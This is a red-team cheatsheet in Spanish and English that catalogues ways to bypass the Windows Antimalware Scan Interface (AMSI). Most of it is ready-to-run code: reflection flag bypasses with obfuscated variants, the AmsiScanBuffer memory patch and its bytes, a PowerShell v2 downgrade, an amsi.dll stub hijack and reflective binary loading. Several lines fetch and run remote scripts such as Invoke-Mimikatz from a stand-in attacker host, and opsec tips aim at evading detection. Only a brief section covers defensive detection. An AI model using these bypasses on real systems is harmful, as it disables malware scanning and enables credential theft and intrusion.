---
aliases:
  - AMSI Bypass
  - AMSI Patching
  - AMSI Evasion
  - Defender Bypass
tags:
  - type/technique
  - technique/defense-evasion
  - technique/execution
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Payload Engineering]]"
type: Atomic
linked:
  - "[[evil-winrm]]"
  - "[[MSFVenom]]"
---
# AMSI Bypasses

***

## Cheatsheet
^amsi-bypasses

| Bypass | Cuándo |
| --- | --- |
| **amsiInitFailed** (classic) | Default Defender, no EDR moderno |
| **AmsiScanBuffer patch** | EDR basic, bypass reflection-proof |
| **Obfuscated classic** | String signatures bloqueadas |
| **AMSI_RESULT_NOT_DETECTED** | Forzar return value en hook |
| **DLL hijack** (amsi.dll) | Local admin, aprobación CLM difícil |
| **PowerShell v2** | Legacy Windows sin AMSI |
| **Binary loader (Invoke-Binary)** | Saltar PowerShell entirely |

***

## Concepto

**AMSI (Antimalware Scan Interface)** es la API de Microsoft que intercepta contenido antes de ejecutar: PowerShell scripts, VBA macros, JScript, DotNet assemblies, WMI, etc. El antivirus (Defender, McAfee, CrowdStrike, Elastic) consume esta interface via `AmsiScanBuffer`.

Bypass = **desactivar / corromper la llamada** desde el proceso actual. AMSI vive en `amsi.dll` cargado in-process → manipulable desde userland sin permissions especiales.

Scope: afecta solo al proceso actual (PowerShell, wscript, etc). No persistente ni global.

## 1. Classic amsiInitFailed (Matt Graeber 2016)

```powershell
# Funciona en Defender sin EDR adicional
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Mecanismo: AMSI flag interno `amsiInitFailed` → si `true`, PowerShell skipea scans subsequent.

**Detectado** por Defender moderno por string signature del payload. Obfuscate.

### Variantes obfuscadas

```powershell
# Reorder/concat
$a = 'System.Management.Automation.A';$b = 'msiUtils'
[Ref].Assembly.GetType("$a$b").GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Base64 + invoke
$s = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgiU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMiKS5HZXRGaWVsZCgiYW1zaUluaXRGYWlsZWQiLCJOb25QdWJsaWMsU3RhdGljIikuU2V0VmFsdWUoJG51bGwsJHRydWUp'))
iex $s

# Char split
$t='S'+'ys'+'t'+'em.Management.Automation.'+'A'+'m'+'siUtils'
$f='amsiInitFailed'
[Ref].Assembly.GetType($t).GetField($f,'NonPublic,Static').SetValue($null,$true)
```

### One-liner stealth (rastamouse)

```powershell
$A=[Ref].Assembly.GetTypes();Foreach($B in $A) {if ($B.Name -like "*iUtils") {$C=$B}};$D=$C.GetFields('NonPublic,Static');Foreach($E in $D) {if ($E.Name -like "*Failed") {$F=$E}};$F.SetValue($Null,$True)
```

## 2. AmsiScanBuffer memory patch

Parchea directamente los bytes de `AmsiScanBuffer` en memoria — bypass reflection-based detections.

```powershell
# @_RastaMouse minimal patch (devuelve AMSI_RESULT_NOT_DETECTED)
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "ScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

Return value `0x80070057 = E_INVALIDARG` → AMSI rechaza scan, PowerShell ejecuta anyway.

### Bytes alternativos

| Bytes | Efecto |
| --- | --- |
| `0xB8 0x57 0x00 0x07 0x80 0xC3` | Return `E_INVALIDARG` |
| `0xB8 0x00 0x00 0x00 0x00 0xC3` | Return `0` (AMSI_RESULT_CLEAN) |
| `0xC3` | RET directo (sin return value válido, a veces funciona) |

## 3. PowerShell v2 downgrade

Windows 7+ trae PS v2 como fallback. **AMSI no existe en v2**.

```powershell
# Check if v2 available
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2

# Launch v2 (sin AMSI)
powershell -version 2

# En v2 todo se ejecuta sin scan
IEX (New-Object Net.WebClient).DownloadString('http://atk/script.ps1')
```

**Detección**: `Event ID 400` con `HostApplication` containing `version 2`. Fácil de hunt.

## 4. DLL hijack amsi.dll

Local admin → replace `amsi.dll` con versión stub que siempre retorna `S_OK`:

```c
// amsi.dll stub (pseudo)
HRESULT AmsiScanBuffer(HAMSICONTEXT ctx, PVOID buf, ULONG len, LPCWSTR name, HAMSISESSION sess, AMSI_RESULT* result) {
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}
```

Colocar en path de búsqueda PE del target (app dir antes que System32). Usually requires admin for system apps.

## 5. .NET payloads — AMSI via Assembly.Load

.NET post-9.0 tiene AMSI nativo. Para `Assembly.Load()` bypasses:

```csharp
// Patch en tiempo de ejecución
typeof(System.Management.Automation.AmsiUtils)
    .GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static)
    .SetValue(null, true);
```

## 6. Sin PowerShell — binary loaders

Evitar PowerShell entirely — C# / Rust / Go binaries no pasan por AMSI (a menos que sean .NET assemblies cargadas via `Assembly.Load`).

### evil-winrm Invoke-Binary
```
*Evil-WinRM* > Invoke-Binary /path/to/Rubeus.exe 'triage'
# Carga reflectivamente — no escribe disk, no AMSI
```

### donut + reflective PE
```bash
# En atacante
donut -f 1 -i Rubeus.exe -o rubeus.bin
# Rubeus.exe → shellcode → load via reflective loader
```

### WAPP (AMSI Protection Profile)
```powershell
# Deshabilita AMSI para el proceso child via environment var
$env:__PSLockdownPolicy = '4'    # (depende de config, rarely works)
```

## 7. CLM (Constrained Language Mode) bypass

Paralelo a AMSI. Si PowerShell está en CLM por AppLocker/WDAC → muchos cmdlets bloqueados.

```powershell
# Check modo
$ExecutionContext.SessionState.LanguageMode

# Downgrade a PSv2 (no CLM en v2)
powershell -version 2

# O via runspace custom (escapes CLM)
$rs = [RunspaceFactory]::CreateRunspace()
$rs.Open()
$ps = [PowerShell]::Create()
$ps.Runspace = $rs
$ps.AddScript("cmd").Invoke()
```

## 8. Testing bypass

```powershell
# Payload "EICAR" para AMSI (script auto-flagged)
'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
# Si imprime sin error → bypass OK
# Si block / warn → AMSI activo
```

O testing con real payload (Invoke-Mimikatz típico):
```powershell
iex (new-object net.webclient).downloadstring('http://atk/Invoke-Mimikatz.ps1')
# Sin bypass → error "This script contains malicious content..."
# Con bypass → ejecuta OK
```

## Detecciones / opsec

- **Script Block Logging (4104)** — captura script completo ANTES de AMSI intercept. Bypass AMSI no evita logging.
- **AMSI Telemetry** (via WMI) — EDRs modernos detectan patches de memoria.
- **String signatures** — classic `amsiInitFailed` flagged por Defender; obfuscate.
- **ETW (Event Tracing for Windows)** — `Microsoft-Antimalware-Scan-Interface` provider logea bypasses conocidos.

### OPSec tips

- **Test local**: spin up VM con Defender current definitions antes de usar en engagement.
- **Obfuscation**: Invoke-Obfuscation / AMSI-bypass generators mantienen pace con signatures.
- **Memory patch > reflection** para EDR moderno.
- **Avoid PowerShell**: si el target soporta, usa binario .exe con reflective loader.

## Recursos

- [rastamouse — AMSI bypass techniques](https://rastamouse.me/memory-patching-amsi-bypass/)
- [amsi.fail](https://amsi.fail/) — generator one-liners fresh
- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
- [S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)

***
